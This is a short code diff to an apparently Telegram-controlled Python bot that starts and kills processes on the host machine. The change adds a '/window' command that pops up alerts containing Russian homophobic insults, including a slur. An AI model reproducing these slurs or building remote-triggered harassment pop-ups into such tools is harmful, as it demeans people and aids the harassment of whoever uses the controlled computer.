@@ -39,7 +39,10 @@ def commands(message):
         elif message.text == '/process':
                 bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)')
                 bot.register_next_step_handler(message,get_process)
-
+                
+        elif message.text == '/window':
+                pyautogui.alert("Ты пидор", "Тест", button="да")
+                pyautogui.alert("Ты гей", "Тест", button="да")
                 
         elif message.text == '/kill':
                 bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
